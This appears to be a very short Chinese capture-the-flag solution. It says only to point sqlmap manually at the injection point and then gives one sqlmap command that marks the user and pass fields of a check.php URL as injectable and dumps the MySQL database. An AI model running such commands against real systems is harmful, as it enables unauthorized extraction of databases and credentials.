# 解

sqlmap手动指定注入点即可
```console
$ sqlmap -u "http://DOMAIN_SUFFIX.weilei.software//check.php?data=user:*|pass:*" --dbms=mysql --dump
```